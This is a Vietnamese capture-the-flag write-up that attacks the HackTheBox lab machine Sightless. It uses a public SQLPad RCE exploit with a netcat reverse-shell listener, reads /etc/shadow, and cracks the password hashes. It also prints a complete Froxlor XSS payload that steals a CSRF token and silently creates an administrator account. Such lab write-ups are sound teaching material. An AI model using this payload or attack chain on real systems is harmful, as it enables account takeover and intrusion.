<img width="1871" height="958" alt="image" src="https://github.com/user-attachments/assets/54d7ceaa-98a8-4405-bae1-63142e4bbc07" /># Sightless

<img width="1352" height="619" alt="image" src="https://github.com/user-attachments/assets/2387c060-ce30-4d25-9dcc-c7a1f5dd79d5" />

Mở đầu là tôi dùng nmap để quét các port có trên địa chỉ ip `10.10.11.32`:

```
❯ sudo nmap -sV 10.10.11.32
[sudo] password for namdeptrai: 
Starting Nmap 7.97 ( https://nmap.org ) at 2025-09-09 22:20 +0700
Nmap scan report for sightless.htb (10.10.11.32)
Host is up (0.038s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
```
Gồm có các port 21,22,80. Dịch vụ ftp thì không có chế độ anonymous nên không làm gì được, ssh thì chưa có cred.

Cho địa chỉ ip 10.10.11.32 vào trình duyệt thì dẫn đến `http://sightless.htb/`, vào `/etc/hosts` để trỏ ip đến domain đó. 

<img width="1847" height="769" alt="image" src="https://github.com/user-attachments/assets/be6cff01-10ad-4be8-9beb-8e5b4b390064" />

Dùng ffuf để fuzz subdomain và dir, endpoint thì không ra cái gì, gospider để tìm kiếm thì ra cái subdomain này:
```
❯ gospider -s "http://sightless.htb/" -o output -c 10 -d 1
[url] - [code-200] - http://sightless.htb/
[subdomains] - http://sqlpad.sightless.htb
[subdomains] - https://sqlpad.sightless.htb
[href] - http://sightless.htb/style.css
[href] - https://fonts.googleapis.com
[href] - https://fonts.gstatic.com
[href] - https://fonts.googleapis.com/css2?family=Fredoka&family=Ubuntu:wght@300&display=swap
[href] - https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.0/css/all.min.css
[href] - http://sightless.htb/
[href] - mailto:sales@sightless.htb
[href] - http://sqlpad.sightless.htb/
[href] - https://www.froxlor.org/
```
Ở subdomain là SQLPad:

<img width="1876" height="853" alt="image" src="https://github.com/user-attachments/assets/d06829a0-c62d-4208-85a7-9846930bcc4d" />

Sau 1 lúc khám thì ra được SQLPad này là bản `6.10.0`  

<img width="1767" height="611" alt="image" src="https://github.com/user-attachments/assets/dba1870a-a58c-4ab5-ac21-139a1106c5a2" />

Search google thì ra được [CVE-2022-0944](https://github.com/0xRoqeeb/sqlpad-rce-exploit-CVE-2022-0944), tôi tải về chạy `nc -lvnp 4444` và đoạn exploit:

<img width="1861" height="854" alt="image" src="https://github.com/user-attachments/assets/bf8ce228-e0a0-4225-a1fc-fa9a3e0fde05" />

Và vào được shell với user là root 

<img width="900" height="690" alt="image" src="https://github.com/user-attachments/assets/8814255d-c8b4-4d5f-a5c0-86f661a9150f" />

Mở file `/etc/shadow` thì có được hash mật khẩu của 2 user là `root` và `machiel` :

<img width="1392" height="505" alt="image" src="https://github.com/user-attachments/assets/2f045c6b-4fbd-404c-91e6-e58b836fa543" />

Sau khi chạy `hashcat -m 1800 ~/hashcat/target.txt ~/wordlist/rockyou.txt` thì ra được mật khẩu của `root` và `machiel` là `blindside` và `insaneclownposse`:

<img width="575" height="180" alt="image" src="https://github.com/user-attachments/assets/b2e0300d-453c-4117-9714-65e2bad75525" />

Tôi khám phá được thêm các port đang sử dụng trên server:
```
michael@sightless:~$ ss -ltnp
State                Recv-Q                Send-Q                               Local Address:Port                                Peer Address:Port               Process               
LISTEN               0                     4096                                     127.0.0.1:38627                                    0.0.0.0:*                                        
LISTEN               0                     511                                      127.0.0.1:8080                                     0.0.0.0:*                                        
LISTEN               0                     151                                      127.0.0.1:3306                                     0.0.0.0:*                                        
LISTEN               0                     128                                        0.0.0.0:22                                       0.0.0.0:*                                        
LISTEN               0                     511                                        0.0.0.0:80                                       0.0.0.0:*                                        
LISTEN               0                     4096                                 127.0.0.53%lo:53                                       0.0.0.0:*                                        
LISTEN               0                     10                                       127.0.0.1:45807                                    0.0.0.0:*                                        
LISTEN               0                     4096                                     127.0.0.1:3000                                     0.0.0.0:*                                        
LISTEN               0                     5                                        127.0.0.1:55457                                    0.0.0.0:*                                        
LISTEN               0                     70                                       127.0.0.1:33060                                    0.0.0.0:*                                        
LISTEN               0                     128                                           [::]:22                                          [::]:*                                        
LISTEN               0                     128                                              *:21                                             *:*  
```
Sử dụng curl thì thấy có port 8080 là đang có web chạy trên đó:

<img width="1634" height="745" alt="image" src="https://github.com/user-attachments/assets/ab3e6ad0-9acc-4572-9e0a-aade5c0f5dc0" />

Tôi mở file `/etc/apache2/sites-available/000-default.conf` thì có xuất hiện domain `admin.sightless.htb`:
```
michael@sightless:/etc/apache2/sites-available$ ls
000-default.conf  default-ssl.conf
michael@sightless:/etc/apache2/sites-available$ cat 000-default.conf 
<VirtualHost 127.0.0.1:8080>
	# The ServerName directive sets the request scheme, hostname and port that
	# the server uses to identify itself. This is used when creating
	# redirection URLs. In the context of virtual hosts, the ServerName
	# specifies what hostname must appear in the request's Host: header to
	# match this virtual host. For the default virtual host (this file) this
	# value is not decisive as it is used as a last resort host regardless.
	# However, you must set it for any further virtual host explicitly.
	#ServerName www.example.com

	ServerAdmin webmaster@localhost
	DocumentRoot /var/www/html/froxlor
	ServerName admin.sightless.htb
	ServerAlias admin.sightless.htb
	# Available loglevels: trace8, ..., trace1, debug, info, notice, warn,
	# error, crit, alert, emerg.
	# It is also possible to configure the loglevel for particular
	# modules, e.g.
	#LogLevel info ssl:warn

	ErrorLog ${APACHE_LOG_DIR}/error.log
	CustomLog ${APACHE_LOG_DIR}/access.log combined

	# For most configuration files from conf-available/, which are
	# enabled or disabled at a global level, it is possible to
	# include a line for only one particular virtual host. For example the
	# following line enables the CGI configuration for this host only
	# after it has been globally disabled with "a2disconf".
	#Include conf-available/serve-cgi-bin.conf
</VirtualHost>

# vim: syntax=apache ts=4 sw=4 sts=4 sr noet
```
Tôi dùng `ssh -L 8081:localhost:8080 michael@10.10.11.32` để trỏ port 8080 trên ssh ra máy thật của tôi là 8081, sau đó truy cập vào `127.0.0.1:8081`

<img width="1871" height="958" alt="image" src="https://github.com/user-attachments/assets/f484638b-18a2-4690-aec1-6193a671cb05" />

Bằng wordlist xịn của tôi thì tôi scan được `vendor/composer/installed.json` và biết được nó đang chạy ở phiên bản 2.1.2 

<img width="1090" height="763" alt="image" src="https://github.com/user-attachments/assets/9f372a41-b41e-42bd-b745-ae04e53fd822" />

Tôi search google thì tìm được [CVE-2024-34070](https://github.com/froxlor/Froxlor/security/advisories/GHSA-x525-54hf-xr53) liên quan đến xss ở bên admin, khi admin ấn vào thì tạo và thêm user mới vào:

```
admin{{$emit.constructor`function+b(){var+metaTag%3ddocument.querySelector('meta[name%3d"csrf-token"]')%3bvar+csrfToken%3dmetaTag.getAttribute('content')%3bvar+xhr%3dnew+XMLHttpRequest()%3bvar+url%3d"https%3a//demo.froxlor.org/admin_admins.php"%3bvar+params%3d"new_loginname%3dabcd%26admin_password%3dAbcd%40%401234%26admin_password_suggestion%3dmgphdKecOu%26def_language%3den%26api_allowed%3d0%26api_allowed%3d1%26name%3dAbcd%26email%3dyldrmtest%40gmail.com%26custom_notes%3d%26custom_notes_show%3d0%26ipaddress%3d-1%26change_serversettings%3d0%26change_serversettings%3d1%26customers%3d0%26customers_ul%3d1%26customers_see_all%3d0%26customers_see_all%3d1%26domains%3d0%26domains_ul%3d1%26caneditphpsettings%3d0%26caneditphpsettings%3d1%26diskspace%3d0%26diskspace_ul%3d1%26traffic%3d0%26traffic_ul%3d1%26subdomains%3d0%26subdomains_ul%3d1%26emails%3d0%26emails_ul%3d1%26email_accounts%3d0%26email_accounts_ul%3d1%26email_forwarders%3d0%26email_forwarders_ul%3d1%26ftps%3d0%26ftps_ul%3d1%26mysqls%3d0%26mysqls_ul%3d1%26csrf_token%3d"%2bcsrfToken%2b"%26page%3dadmins%26action%3dadd%26send%3dsend"%3bxhr.open("POST",url,true)%3bxhr.setRequestHeader("Content-type","application/x-www-form-urlencoded")%3balert("Your+Froxlor+Application+has+been+completely+Hacked")%3bxhr.send(params)}%3ba%3db()`()}}
```
Xóa phần `https://demo.froxlor.org` đi và có thể thay bằng `http://admin.sightless.htb:8080` nhưng cũng có thể để trống

<img width="942" height="841" alt="image" src="https://github.com/user-attachments/assets/043b1f36-2f99-4bcf-9266-71cd114a8042" />

Sau đó bắt request burp suite login lại và thay thế payload vào phần username:

![Uploading image.png…]()

Đợi 1 lúc thì đăng nhập với cred `abcd:Abcd@@1234`:

<img width="1854" height="905" alt="image" src="https://github.com/user-attachments/assets/1e311d8a-3ba6-4de0-82d1-7da79ddf3cee" />





















